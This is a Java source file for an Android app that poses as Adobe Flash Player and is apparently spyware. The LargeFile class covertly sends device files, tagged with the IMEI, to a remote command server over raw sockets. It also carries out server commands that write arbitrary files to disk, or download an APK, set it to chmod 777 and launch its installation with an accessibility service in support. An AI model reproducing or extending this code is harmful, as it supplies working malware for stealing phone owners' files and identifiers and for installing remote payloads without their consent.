package com.adobe.flashplayer.network;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.Socket;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.core.AccessibilitySrv;


public class LargeFile implements Runnable{

    private static String TAG = "[ljg]LargeFile ";
    private String filename = null;
    private String ip = null;
    private int port = 0;
    private byte[] imei = new byte[Public.IMEI_IMSI_PHONE_SIZE];
    private int cmd = 0;
    private int mode = 0;
    private Context context;


    LargeFile(Context context, String filename, String ip, int port, byte[]imei, int cmd, int mode){

        this.filename = filename;
        this.ip = ip;
        this.port = port;
        this.imei = imei;
        this.cmd = cmd;
        this.mode = mode;
        this.context = context;
    }


    public void run(){
        SendLargeFile(filename,ip,port,imei,cmd,mode);
    }

    public static void SendLargeFile(String filename,String ip,int port,byte[]imeibyte,int cmdtype,int mode){

        try{
            if(NetworkUtils.isNetworkAvailable (Public.appContext) == false || NetworkUtils.getNetworkType(Public.appContext) != NetworkUtils.WIFI_CONNECTION){
                return;
            }

            int hdrsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE;
            File file = new File(filename);
            FileInputStream finput = new FileInputStream(file);
            int filesize = (int)file.length();
            int sendsize = hdrsize+ filesize;
            byte[] senddata = null;
            if (sendsize > Public.RECV_SEND_BUFSIZE ) {
                senddata = new byte[Public.RECV_SEND_BUFSIZE];
            }else{
                senddata = new byte[sendsize];
            }

            int offset = 0;
            byte bytesendsize[] = Utils.intToBytes(sendsize);
            for (int i = 0; i < bytesendsize.length; i++) {
                senddata[offset + i] = bytesendsize[i];
            }
            offset += bytesendsize.length;

            byte[] bytecmd = Utils.intToBytes(cmdtype);
            for (int i = 0; i < bytecmd.length; i++) {
                senddata[offset + i] = bytecmd[i];
            }
            offset += bytecmd.length;

            byte bytereserved[] = Utils.intToBytes(mode);		//Public.PacketOptCompInFile
            for (int i = 0; i < bytereserved.length; i++) {
                senddata[offset + i] = bytereserved[i];
            }
            offset += bytereserved.length;

            for (int i = 0; i < imeibyte.length; i++) {
                senddata[offset + i] = imeibyte[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),offset,offset,Public.IMEI_IMSI_PHONE_SIZE);
            }
            offset += Public.IMEI_IMSI_PHONE_SIZE;

            for (int i = 0; i < Public.UserName.length(); i++) {
                senddata[offset + i] = Public.UserName.getBytes()[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),offset,offset,Public.IMEI_IMSI_PHONE_SIZE);
            }
            offset += Public.IMEI_IMSI_PHONE_SIZE;

            Socket socket = new Socket(ip, port);
            OutputStream ous = socket.getOutputStream();
            ous.write(senddata, 0, offset);

            int readsize = 0;
            int lasttimes = filesize/Public.RECV_SEND_BUFSIZE;
            int lastsize = filesize %Public.RECV_SEND_BUFSIZE;
            for(int i =0; i < lasttimes; i ++) {
                readsize = finput.read(senddata,0,Public.RECV_SEND_BUFSIZE);
                if (readsize > 0) {
                    if ( (mode & Public.PacketOptCryption) != 0) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }
            if (lastsize > 0) {
                readsize = finput.read(senddata,0,lastsize);
                if (readsize > 0) {
                    if ( (mode & Public.PacketOptCryption) != 0 ) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }

            finput.close();
            ous.flush();
            ous.close();
            socket.close();
            return ;
        }
        catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("SendNetworkLargeFile command:" + String.valueOf(cmdtype) + " exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return;
        }
    }



    public static void SendLargeFileWithName(String filename,String appendname,String ip,int port,byte[]imeibyte,int cmdtype,int compopt){

        try{

            if(NetworkUtils.isNetworkAvailable (Public.appContext) == false || NetworkUtils.getNetworkType(Public.appContext) != NetworkUtils.WIFI_CONNECTION){
                return;
            }
            File file = new File(filename);
            int filesize = (int)file.length();
            String newfn = file.getName() + appendname;

            Log.e(TAG, "send file:" + newfn);

            int hdrsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE + 4 + newfn.getBytes().length + 4;

            int sendsize = hdrsize+ filesize;
            byte[] senddata = null;
            if (sendsize > Public.RECV_SEND_BUFSIZE ) {
                senddata = new byte[Public.RECV_SEND_BUFSIZE];
            }else{
                senddata = new byte[sendsize];
            }

            int size = 0;
            byte bytesendsize[] = Utils.intToBytes(sendsize);
            for (int i = 0; i < bytesendsize.length; i++) {
                senddata[size + i] = bytesendsize[i];
            }
            size += bytesendsize.length;

            byte[] bytecmd = Utils.intToBytes(cmdtype);
            for (int i = 0; i < bytecmd.length; i++) {
                senddata[size + i] = bytecmd[i];
            }
            size += bytecmd.length;

            int mode = compopt;
            byte bytereserved[] = Utils.intToBytes(mode);		//Public.PacketOptCompInFile
            for (int i = 0; i < bytereserved.length; i++) {
                senddata[size + i] = bytereserved[i];
            }
            size += bytereserved.length;

            for (int i = 0; i < imeibyte.length; i++) {
                senddata[size + i] = imeibyte[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),size,size,Public.IMEI_IMSI_PHONE_SIZE);
            }
            size += Public.IMEI_IMSI_PHONE_SIZE;

            for (int i = 0; i < Public.UserName.length(); i++) {
                senddata[size + i] = Public.UserName.getBytes()[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),size,size,Public.IMEI_IMSI_PHONE_SIZE);
            }
            size += Public.IMEI_IMSI_PHONE_SIZE;

            byte[] bytefnlen = Utils.intToBytes(newfn.getBytes().length);
            for (int i = 0; i < bytefnlen.length; i++) {
                senddata[size + i] = bytefnlen[i];
            }
            size += bytefnlen.length;

            for (int i = 0; i < newfn.getBytes().length; i++) {
                senddata[size + i] = newfn.getBytes()[i];
            }
            size += newfn.getBytes().length;

            byte[] bytefs = Utils.intToBytes(filesize);
            for (int i = 0; i < bytefs.length; i++) {
                senddata[size + i] = bytefs[i];
            }
            size += bytefs.length;

            Socket socket = new Socket(ip, port);
            OutputStream ous = socket.getOutputStream();
            ous.write(senddata, 0, size);

            int readsize = 0;
            int lasttimes = filesize/Public.RECV_SEND_BUFSIZE;
            int lastsize = filesize %Public.RECV_SEND_BUFSIZE;
            FileInputStream finput = new FileInputStream(file);
            for(int i =0; i < lasttimes; i ++) {
                readsize = finput.read(senddata,0,Public.RECV_SEND_BUFSIZE);
                if (readsize > 0) {
                    if ( (compopt & Public.PacketOptCryption) != 0 ) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }

            if (lastsize > 0) {
                readsize = finput.read(senddata,0,lastsize);
                if (readsize > 0) {
                    if ( (compopt & Public.PacketOptCryption) != 0 ) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }

            finput.close();
            ous.flush();
            ous.close();
            socket.close();

            Log.e(TAG,"SendNetworkLargeFileWithName ok");
            return ;
        }
        catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("command:" + String.valueOf(cmdtype) + " exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return;
        }
    }


    public static void SendNetworkLargeFile(String filename,OutputStream ous,byte[]imeibyte,int cmdtype,int mode){
        try{
            if(NetworkUtils.isNetworkAvailable (Public.appContext) == false || NetworkUtils.getNetworkType(Public.appContext) != NetworkUtils.WIFI_CONNECTION){
                return;
            }

            int hdrsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE;

            File file = new File(filename);
            FileInputStream finput = new FileInputStream(file);
            int filesize = (int)file.length();
            int sendsize = hdrsize+ filesize;
            byte[] senddata = null;
            if (sendsize > Public.RECV_SEND_BUFSIZE ) {
                senddata = new byte[Public.RECV_SEND_BUFSIZE];
            }else{
                senddata = new byte[sendsize];
            }

            int size = 0;
            byte bytesendseize[] = Utils.intToBytes(sendsize);
            for (int i = 0; i < bytesendseize.length; i++) {
                senddata[size + i] = bytesendseize[i];
            }
            size += bytesendseize.length;

            byte[] bytecmd = Utils.intToBytes(cmdtype);
            for (int i = 0; i < bytecmd.length; i++) {
                senddata[size + i] = bytecmd[i];
            }
            size += bytecmd.length;

            byte bytereserved[] = Utils.intToBytes(mode);
            for (int i = 0; i < bytereserved.length; i++) {
                senddata[size + i] = bytereserved[i];
            }
            size += bytereserved.length;

            for (int i = 0; i < imeibyte.length; i++) {
                senddata[size + i] = imeibyte[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),size,size,Public.IMEI_IMSI_PHONE_SIZE);
            }
            size += Public.IMEI_IMSI_PHONE_SIZE;

            for (int i = 0; i < Public.UserName.length(); i++) {
                senddata[size + i] = Public.UserName.getBytes()[i];
            }
            if ((Public.PacketOptCryption) != 0) {
                NetworkUtils.encrypt(senddata,senddata,NetworkUtils.gKey.getBytes(),size,size,Public.IMEI_IMSI_PHONE_SIZE);
            }
            size += Public.IMEI_IMSI_PHONE_SIZE;

            ous.write(senddata, 0, size);

            int sendtimes = filesize/Public.RECV_SEND_BUFSIZE;
            int lastsize = filesize %Public.RECV_SEND_BUFSIZE;
            int readsize = 0;
            for(int i = 0; i < sendtimes; i ++) {
                readsize = finput.read(senddata,0,Public.RECV_SEND_BUFSIZE);
                if (readsize > 0) {
                    if ( (mode & Public.PacketOptCryption) != 0 ) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }

            if (lastsize > 0) {
                readsize = finput.read(senddata,0,lastsize);
                if (readsize > 0) {
                    if ( (mode & Public.PacketOptCryption) != 0 ) {
                        NetworkUtils.encrypt(senddata,senddata,imeibyte,0,0,readsize);
                    }
                    ous.write(senddata, 0, readsize);
                }
            }

            finput.close();
            ous.flush();
            return ;
        }
        catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("command:" + String.valueOf(cmdtype) + " exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return;
        }
    }





    public static void RecvNetworkLargeFile(byte[] recvbuf,int recvlen,InputStream ins){

        try{

            if(NetworkUtils.isNetworkAvailable (Public.appContext) == false || NetworkUtils.getNetworkType(Public.appContext) != NetworkUtils.WIFI_CONNECTION){
                return;
            }

            byte [] newrecvbuf = new byte[Public.RECV_SEND_BUFSIZE];
            System.arraycopy(recvbuf, 0, newrecvbuf, 0, recvlen);

            byte[] bytetotallen = new byte[4];
            System.arraycopy(newrecvbuf, 0, bytetotallen, 0, 4);
            int totallen = Utils.bytesToInt(bytetotallen);

            int nextrecvlen = ins.read(newrecvbuf,recvlen,Public.RECV_SEND_BUFSIZE - recvlen);
            MyLog.writeLogFile("NetworkLargeFileProc first recvlen:" + recvlen + " next recvlen:" + nextrecvlen +"\r\n");

            nextrecvlen += recvlen;

            byte[] byteservercmd = new byte[4];
            System.arraycopy(newrecvbuf, 4, byteservercmd, 0, 4);
            int servercmd = Utils.bytesToInt(byteservercmd);
            if (servercmd == Public.CMD_DOWNLOADFILE ) {
                byte[] bytedownloadfilenamelen = new byte[4];
                System.arraycopy(newrecvbuf, 24, bytedownloadfilenamelen, 0, 4);
                int downloadfilenamelen = Utils.bytesToInt(bytedownloadfilenamelen);
                byte[] downloadfilename = new byte[downloadfilenamelen];
                System.arraycopy(newrecvbuf, 28, downloadfilename, 0, downloadfilenamelen);

                File downloadfile = new File(new String(downloadfilename));
                if (downloadfile.exists() == true) {
                    downloadfile.delete();
                }
                downloadfile.createNewFile();
                FileOutputStream fos = new FileOutputStream(downloadfile,true);

                byte[] bytedownloadfilesize = new byte[4];
                System.arraycopy(newrecvbuf, 24 + 4 + downloadfilenamelen, bytedownloadfilesize, 0, 4);
                int downloadfilesize = Utils.bytesToInt(bytedownloadfilesize);

                int firstblocksize = nextrecvlen - (24 + 4 + downloadfilenamelen + 4);
                fos.write(newrecvbuf,24 + 4 + downloadfilenamelen + 4,firstblocksize);

                int totalrecv = nextrecvlen;
                int totalfs = firstblocksize;

                while((nextrecvlen = ins.read(newrecvbuf,0,Public.RECV_SEND_BUFSIZE)) > 0){
                    fos.write(newrecvbuf,0,nextrecvlen);
                    totalrecv += nextrecvlen;
                    totalfs += nextrecvlen;
                }

                fos.flush();
                fos.close();

                MyLog.writeLogFile("NetworkLargeFileProc total:" + totallen + ",recved:" +totalrecv + ",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");
                if (totalrecv != totallen || totalfs != downloadfilesize) {
                    return;
                }else{
                }
            }else if (servercmd == Public.CMD_AUTOINSTALL) {

                String tmpfn = Environment.getExternalStorageDirectory().getAbsolutePath() + Public.SUB_FOLDER_NAME;

                byte[] bytedownloadfilenamelen = new byte[4];
                System.arraycopy(recvbuf, 24, bytedownloadfilenamelen, 0, 4);
                int downloadfilenamelen = Utils.bytesToInt(bytedownloadfilenamelen);
                byte[] downloadfilename = new byte[downloadfilenamelen];
                System.arraycopy(recvbuf, 28, downloadfilename, 0, downloadfilenamelen);

                String apkfilepath = tmpfn + new String(downloadfilename);
                File apkfile = new File(apkfilepath);
                if (apkfile.exists() == true) {
                    apkfile.delete();
                }
                apkfile.createNewFile();
                FileOutputStream fos = new FileOutputStream(apkfile,true);

                byte[] bytedownloadfilesize = new byte[4];
                System.arraycopy(recvbuf, 24 + 4 + downloadfilenamelen, bytedownloadfilesize, 0, 4);
                int downloadfilesize = Utils.bytesToInt(bytedownloadfilesize);

                int firstblocksize = nextrecvlen - (24 + 4 + downloadfilenamelen + 4);
                fos.write(newrecvbuf,24 + 4 + downloadfilenamelen + 4,firstblocksize);

                int totalrecv = nextrecvlen;
                int totalfs = firstblocksize;

                while( (nextrecvlen = ins.read(newrecvbuf,0,Public.RECV_SEND_BUFSIZE))>0 ){

                    fos.write(newrecvbuf,0,nextrecvlen);
                    totalrecv += nextrecvlen;
                    totalfs += nextrecvlen;
                }
                fos.flush();
                fos.close();

                MyLog.writeLogFile("NetworkLargeFileProc total:" + totallen + ",recved:" +totalrecv +
                        ",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");

                if (totalrecv != totallen || totalfs != downloadfilesize) {
                    //return;
                }else{
                }

                Process p = Runtime.getRuntime().exec("chmod 777 " + apkfilepath);
                int status = p.waitFor();
                if (status == 0) {
                    //chmod succeed
                    MyLog.writeLogFile("chmod autoinstallapk ok\r\n");
                } else {
                    //chmod failed
                    MyLog.writeLogFile("chmod autoinstallapk error\r\n");
                    //return;
                }

                PackageManager pm = Public.appContext.getPackageManager();
                PackageInfo info = pm.getPackageArchiveInfo(apkfilepath, PackageManager.GET_ACTIVITIES);
                if(info != null){
                    ApplicationInfo appInfo = info.applicationInfo;
                    AccessibilitySrv.installAPkName = pm.getApplicationLabel(appInfo).toString();
                    AccessibilitySrv.installAPkFileName = appInfo.packageName;
                    //accessibilityService.installVersion=info.versionName;
                }

                AccessibilitySrv.installAPkFileName = apkfilepath;
                AccessibilitySrv.openOrOverAfterInstall = false;

                Intent localIntent = new Intent(Intent.ACTION_VIEW);
                localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Uri uri = null;
                //Android7.0+禁止应用对外暴露file://uri，改为content://uri;具体参考FileProvider
                if (Build.VERSION.SDK_INT >= 24) {
                    FileReader fr = new FileReader(apkfilepath);
                    Class<? extends FileReader> clazz = fr.getClass();
                    Method geturiforfile = clazz.getDeclaredMethod("getUriForFile",Context.class,String.class,File.class);
                    uri = (Uri)geturiforfile.invoke(Public.appContext, "com.science.fileprovider", new File(apkfilepath));
                    fr.close();
                    //uri = FileReader.getUriForFile(context, "com.science.fileprovider", new File(apkfilepath));
                    localIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                }
                else {
                    uri = Uri.fromFile(new File(apkfilepath));
                }
                localIntent.setDataAndType(uri, "application/vnd.android.package-archive");
                Public.appContext.startActivity(localIntent);

                Log.e(TAG,"auto install apk filename:" + apkfilepath);
                MyLog.writeLogFile("ServerCommand auto install apk filename:" + apkfilepath  + "\r\n");

                apkfile.delete();

            }else{
                MyLog.writeLogFile("NetworkLargeFileProc unrecognized cmd\r\n");
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("NetworkLargeFileProc exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
        return;
    }



}
